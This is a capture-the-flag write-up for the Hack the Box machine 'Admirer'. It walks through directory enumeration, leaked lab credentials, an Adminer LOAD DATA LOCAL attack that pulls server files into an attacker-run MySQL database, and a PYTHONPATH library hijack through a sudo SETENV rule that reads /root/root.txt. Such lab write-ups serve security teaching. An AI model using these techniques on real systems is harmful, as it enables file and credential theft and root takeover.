---
title: "Hack the Box: Admirer"
date: "2020-09-28"
authors:
  - Jacob Malcy
draft: false
tags:
  - htb
---

Target IP: 10.10.10.187

## Recon
### Scan
Scan all ports, get version numbers.
```
# Nmap 7.80 scan initiated as: nmap -A -p- 10.10.10.187
Nmap scan report for 10.10.10.187
Host is up (0.065s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
```

Interesting notes from scan:
* There is an vsFTP server on port 21, anonymous FTP is not allowed.
* Apache HTTPd server on port 80.
	* robots.txt has *"/admin-dir"* disallowed, sounds inticing.
* SSHd is running but without credentials it's practically worthless.

### Website Analysis
Browsing to the website on port 80 does not reveal anything interesting (yet).
There are not any manipulatable input fields or anything, but it's really our only way in so far, so let's try some enumeration on the website.

#### Gobuster
Gobuster is a tool that can be used to enumerate directories on a website when given a wordlist.
After trying multiple wordlists, the wordlist that provides some results is from [SecLists](https://github.com/danielmiessler/SecLists), specifically the `SecLists/Discovery/Web-Content/big.txt` list.
Running the command `gobuster -w big.txt -u "http://10.10.10.187/admin-dir/" -x php,txt,html` returns the following information:
* /.htaccess (Status: 403)
* /.htaccess.txt (Status: 403)
* /.htaccess.html (Status: 403)
* /.htaccess.php (Status: 403)
* /.htpasswd (Status: 403)
* /.htpasswd.html (Status: 403)
* /.htpasswd.php (Status: 403)
* /.htpasswd.txt (Status: 403)
* /contacts.txt (Status: 200)
* /credentials.txt (Status: 200)

Ignoring the 403 requests and you'll notice there are two of interest: contacts.txt and credentials.txt.
contacts.txt is not particularly interesting since it includes a few emails on the machine, but credentials.txt is very useful.
```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

The admin page for Wordpress would be located at "http://10.10.10.187/wp-admin" but this returns a 404 status so the credentials are likely worthless. However, using the FTP credentials worked!

## FTP
Using the command `ftp 10.10.10.187` and entering the credentials we found in `credentials.txt` we are able to get into the ftp server. The server contains two files: dump.sql and html.tar.gz.

dump.sql is pretty much useless as it is a dump of the SQL table that contains the images located on the landing web page.
However, html.tar.gz is _very_ useful. It seems to be a backup of everything in the "/var/www/html" folder including some directories we have not seen yet:
* utility-scripts/
* w4ld0s\_s3cr3t\_d1r/

Not only that, but it includes the `index.php` file. Why is this useful? Because located in the file is the code that loads in the images from the MySQL database onto the main page. In order to do this, the plaintext credentials for the MySQL database are located in the code:

```
$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
$dbname = "admirerdb";
```

Since we currently don't have direct access to the database, these credentials are not very useful. The credentials do not work for SSH, but the directory "w4ld0s\_s3cr3t\_d1r" is leet speek for "waldos\_secret\_dir", so it seems waldo is important.

### w4ld0s\_s3cr3t\_d1r/
This directory contains a contacts.txt and credentials.txt almost identical to the ones we found previously. However, the credentials.txt does include a username and password related to a bank account which we may find a use for later, so let's hang onto these files too.

### utility-scripts
The utility-scripts directory contains 4 PHP scripts:
* admin\_tasks.php
* db\_admin.php
* info.php
* phptest.php

phptest.php and info.php are pretty basic and just have some diagnostic php information, but db\_admin.php and admin\_tasks.php have some interesting stuff.

#### admin\_tasks.php
admin\_tasks.php is a page with a dropdown to select between different tasks to run, some of which are rather powerful (e.g., backing up the database, website, or /etc/shadow)
Looking at the PHP code we can find the line `echo str_replace("\n", "<br />", shell_exec("/opt/scripts/admin_tasks.sh $task 2>&1"));` which reveals to us the existence of a script in the "/opt/scripts/" directory. This will be useful later.

#### db\_admin.php
db\_admin.php contains some credentials for a MySQL database located on the host, but that didn't come up in our initial Nmap scan, so we'll just have to keep these credentials in mind for now.

## Gobuster Part 2
Since we've exausted our new information, it's time to begin enumeration on the new directories (utility-scripts and w4ld0s\_s3cr3t\_d1r). Trying multiple wordlists on the waldos secret directory didn't turn up anything,
but /utility-scripts returned `/adminer.php (Status: 200)` (via the same command as before, just a new directory)

## Adminer
Adminer is a database administration web interface. This allows us to try those mysql credentials that we've accessed previously in `index.php` and `db_admin.php`. Unfortunately, the credentials don't work. But we're not done here yet!

### Reading Local Files with Adminer
Adminer version 4.6.2 had a serious vulnerability that allowed you read files on the host machine without connecting to the database on the host itself. The Adminer interface allows you to connect to any database you have credentials for, regardless if it is being hosted on the same machine that Adminer is located on.
If you connect it to a database you control, you can use the `LOAD DATA LOCAL` MySQL command to load files from the target machine to your database.

#### Database Setup
On your Kali machine, MySQL and MariaDB are probably already installed. In order to make sure your MySQL server can be accessed by Adminer, make sure to change your bind-address in `/etc/mysql/mariadb.conf.d/50-server.cnf` to your HTB VPN address. Then, restart your MySQL service (`sudo systemctl restart mysql`).
Then, log into your MySQL server (`sudo mysql -u root -p`) and enter the following commands:

```
CREATE USER 'jacob'@'%' IDENTIFIED BY 'jacob';
GRANT ALL ON *.* TO 'jacob'@'%';
CREATE DATABASE IF NOT EXISTS evil;
USE evil;
CREATE TABLE theLines(
	line TEXT(50000)
);
```

This will create a new user for our evil database, create a MySQL database called "evil", and create a table in that database called "theLines" that stores text.
The point of this database and table is that we will use the vulnerability in Adminer to read files into our database.

#### Adminer Exploitation
Log into your database in the Adminer portal (make sure the hostname is your VPN IP) and go to the SQL Command page on the left.
Once you do, entering the following command will load the `/var/www/html/index.php` file into the `theLines` table:

```
load data local infile "/var/www/html/index.php"
into table evil.theLines
fields terminated by "/n";
```

You can then use Adminer or the MySQL CLI to retrieve the contents of the file. Why did we choose that file? Because it contains updated credentials to the MySQL DB on the machine:

```
$servername = "localhost";
$username = "waldo";
$password = "&<h5b~yK3F#{PaPB&dA}{H>";
$dbname = "admirerdb";
```

Not only are these the updated credentials to the database, they are also the username and password for an SSH user "waldo"

### SSH Access
As mentioned previously, the credentials in the `/var/www/html/index.php` for the MySQL database are also the credentials for the user "waldo". SSHing into the target with these credentials will get you the user flag located in `/home/waldo/user.txt`

## Privilege Escalation
Now that we have SSH access to the machine, we can finally focus on trying to get the root flag.
One of the things you should always check is what privileges your user can gain through sudo. You can do this via `sudo -l`.

Running `sudo -l` while logged in as `waldo` gives the following output:

```
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

What should catch your eye is the mention of `/opt/scripts/admin_tasks.sh`, the script we saw mentioned earlier in the `admin_tasks.php` file.
The output of `sudo -l` is stating that `waldo` is allowed to run the admin\_tasks.sh script as root.
This is a pretty good indication that we might be able to abuse this in some interesting way.

### admin\_tasks.sh
The contents of admin\_tasks.sh reveals it to be a menu system that allows us to do various administrative tasks on the machine. This includes backing up the `/etc/shadow` and `/etc/passwd` to a directory we can view.
Unfortunately, it immediately modifies the permissions of the backup files such that we cannot read them, so that functionality is worthless to us.

However, there is a web backup function that is interesting:

```
backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
```

This runs the Python script `/opt/scripts/backup.py`. This file uses the `make_archive` function of the `shutil` library to create a tar.gz archive of the `/var/www/html` directory.
The backup itself is useless to us, but we can abuse this function call to do something of our design.

### Python Function Override
If we create our own `shutil` library, we may be able to make the `backup.py` program call a function of our design.
Let's make a hidden folder in `/tmp` so as to add a small layer of protection from other users.
This folder will be called `/tmp/.privesc`

In this folder, make your own `shutil.py` with this for the contents:

```
#!/usr/bin/python3

def make_archive(*ignore_parameters):
	with open('/root/root.txt') as f:
		print(f.readlines())
```

This script will give you the root flag when called but it has to actually get called for it to work.
To make the `admin_tasks.sh` program use our `shutil.py`, we run the command as such:
`sudo "PYTHONPATH=/tmp/.privesc" /opt/scripts/admin_tasks.sh 6`

Running this command gives you the root flag!
